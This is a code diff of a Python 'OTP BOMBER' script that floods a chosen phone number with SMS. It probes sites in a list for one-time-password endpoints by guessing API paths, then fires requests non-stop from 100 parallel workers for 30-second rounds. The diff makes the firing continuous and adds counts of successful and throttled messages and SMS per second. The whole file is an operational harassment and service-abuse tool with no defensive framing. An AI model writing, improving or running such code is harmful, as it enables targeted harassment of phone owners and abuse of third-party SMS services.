@@ -4,7 +4,9 @@
 OTP BOMBER
 ==========
 Enter phone number -> enter rounds -> done.
-Every round hits EVERY site in sites.txt, all in parallel.
+
+Every round runs for a FULL 30 seconds and fires non-stop at every live
+site in sites.txt, in parallel. More live sites = more SMS per round.
 
 sites.txt line format:
     domain.com                                  <- tool hunts the endpoint
@@ -18,17 +20,18 @@ import os
 import re
 import sys
 import time
-from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FTimeout
+from concurrent.futures import (ThreadPoolExecutor, as_completed, wait,
+                                FIRST_COMPLETED)
 
 import requests
 
 # ----------------- settings -----------------
-WORKERS       = 100     # parallel requests. raise to 200 for more speed
-ROUND_SECONDS = 30      # hard cap per round
+WORKERS       = 100     # parallel requests in flight. 200 = faster
+ROUND_SECONDS = 30      # every round runs EXACTLY this long
 TIMEOUT       = 12      # per-request timeout
 COUNTRY_CODE  = "972"   # country prefix, no plus
 USE_PLUS      = False   # True -> send +972..., False -> send 972...
-PROBE_LIMIT   = 12      # how many paths to try when the endpoint is unknown
+PROBE_LIMIT   = 12      # paths tried when the endpoint is unknown
 
 UA = ("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36")
@@ -43,7 +46,6 @@ def app_dir():
 HERE = app_dir()
 SITES_FILE = os.path.join(HERE, "sites.txt")
 
-# tried only when a site has no endpoint, or its endpoint failed
 PROBE_PATHS = [
     "/api/auth/send-otp", "/api/auth/otp", "/api/send-otp", "/api/otp/send",
     "/api/v1/auth/otp", "/api/v1/send-otp", "/api/v1/auth/send-otp",
@@ -101,14 +103,13 @@ def fire(base, path, field, phone, style="json"):
         return 0
 
 
-def good(code):
-    """2xx = sent. 429 = correct endpoint but throttled."""
+def alive_code(code):
+    """for discovery: 2xx = works, 429 = works but throttled"""
     return (200 <= code < 300) or code == 429
 
 
 # ----------------- discovery -----------------
 def discover(sites, phone):
-    """keep only the endpoints that actually answer."""
     alive, near = [], []
     print(f"\n[*] Testing {len(sites)} sites. This takes a moment...\n")
     start = time.time()
@@ -122,9 +123,8 @@ def discover(sites, phone):
                 tried.append((p, "phone", "json"))
         for path, field, style in tried:
             code = fire(site["base"], path, field, phone, style)
-            if good(code):
+            if alive_code(code):
                 return (site["base"], path, field, style, code)
-        # remember near-misses (endpoint exists but rejected the payload)
         if tried:
             code = fire(site["base"], tried[0][0], tried[0][1], phone, tried[0][2])
             if 400 <= code < 500 and code != 404:
@@ -133,7 +133,7 @@ def discover(sites, phone):
 
     with ThreadPoolExecutor(max_workers=WORKERS) as ex:
         futs = [ex.submit(check, s) for s in sites]
-        for i, fut in enumerate(as_completed(futs), 1):
+        for fut in as_completed(futs):
             res = fut.result()
             if not res:
                 continue
@@ -153,30 +153,62 @@ def discover(sites, phone):
 
 # ----------------- rounds -----------------
 def run_round(endpoints, phone, budget):
-    sent = ok = fail = 0
+    """fire NON-STOP at every live endpoint for `budget` seconds"""
+    deadline = time.time() + budget
+    stats = {"sent": 0, "ok": 0, "throttled": 0, "fail": 0}
+    n = len(endpoints)
+    idx = 0
     ex = ThreadPoolExecutor(max_workers=WORKERS)
-    futs = [ex.submit(fire, e["base"], e["path"], e["field"], phone, e["style"])
-            for e in endpoints]
+    pending = set()
+    last = time.time()
+
     try:
-        for fut in as_completed(futs, timeout=budget):
-            sent += 1
-            if good(fut.result()):
-                ok += 1
-            else:
-                fail += 1
-    except FTimeout:
-        pass
-    ex.shutdown(wait=False)
-    return sent, ok, fail
+        while True:
+            now = time.time()
+            while len(pending) < WORKERS and now < deadline:
+                e = endpoints[idx % n]
+                idx += 1
+                pending.add(ex.submit(fire, e["base"], e["path"],
+                                      e["field"], phone, e["style"]))
+                now = time.time()
+
+            if not pending:
+                break
+
+            done, pending = wait(pending, timeout=0.15,
+                                 return_when=FIRST_COMPLETED)
+            for f in done:
+                stats["sent"] += 1
+                code = f.result()
+                if 200 <= code < 300:
+                    stats["ok"] += 1
+                elif code == 429:
+                    stats["throttled"] += 1
+                else:
+                    stats["fail"] += 1
+
+            if time.time() - last >= 1.0:
+                last = time.time()
+                left = max(0.0, deadline - time.time())
+                print(f"\r      {left:4.1f}s left   sent {stats['sent']}   "
+                      f"ok {stats['ok']}   throttled {stats['throttled']}",
+                      end="", flush=True)
+
+            if time.time() >= deadline and not pending:
+                break
+    finally:
+        ex.shutdown(wait=False)
+    print()
+    return stats
 
 
 def main():
-    print("=" * 52)
-    print("            O T P   B O M B E R")
-    print("=" * 52)
+    print("=" * 56)
+    print("               O T P   B O M B E R")
+    print("=" * 56)
 
     if not os.path.exists(SITES_FILE):
-        print(f"\n[X] sites.txt not found next to this program.")
+        print("\n[X] sites.txt not found next to this program.")
         input("\nPress Enter to exit...")
         return
 
@@ -196,6 +228,7 @@ def main():
         rounds = int(input("How many rounds: ").strip() or "1")
     except ValueError:
         rounds = 1
+    rounds = max(1, rounds)
 
     alive = discover(sites, phone)
     if not alive:
@@ -203,28 +236,31 @@ def main():
         input("\nPress Enter to exit...")
         return
 
-    print(f"[*] Starting {rounds} rounds. Ctrl+C to stop.\n")
+    print(f"[*] {rounds} rounds x {ROUND_SECONDS}s = "
+          f"{rounds * ROUND_SECONDS}s of non-stop firing.")
+    print("[*] Ctrl+C to stop early.\n")
+
     t0 = time.time()
-    total_ok = 0
-    try:
-        for r in range(1, rounds + 1):
-            rs = time.time()
-            sent, ok, fail = run_round(alive, phone, ROUND_SECONDS)
-            total_ok += ok
-            el = time.time() - rs
-            print(f"  Round {r}/{rounds}   sent {sent}/{len(alive)}   "
-                  f"ok {ok}   fail {fail}   ({el:.1f}s)")
-    except KeyboardInterrupt:
-        print("\n\n[*] stopped.")
+    tot_ok = tot_sent = tot_thr = 0
+    for r in range(1, rounds + 1):
+        print(f"  Round {r}/{rounds}")
+        st = run_round(alive, phone, ROUND_SECONDS)
+        tot_ok += st["ok"]
+        tot_sent += st["sent"]
+        tot_thr += st["throttled"]
+        print(f"    -> sent {st['sent']}   ok {st['ok']}   "
+              f"throttled {st['throttled']}   fail {st['fail']}\n")
 
     el = time.time() - t0
-    print("\n" + "=" * 52)
-    print(f"  rounds      : {rounds}")
-    print(f"  total sent  : {total_ok} successful SMS requests")
-    print(f"  total time  : {el:.0f}s")
+    print("=" * 56)
+    print(f"  rounds          : {rounds}")
+    print(f"  requests sent   : {tot_sent}")
+    print(f"  successful SMS  : {tot_ok}")
+    print(f"  throttled (429) : {tot_thr}")
+    print(f"  total time      : {el:.0f}s")
     if el > 0:
-        print(f"  speed       : {total_ok / el:.1f} sms/sec")
-    print("=" * 52)
+        print(f"  speed           : {tot_ok / el:.1f} sms/sec")
+    print("=" * 56)
     input("\nPress Enter to exit...")
 
 
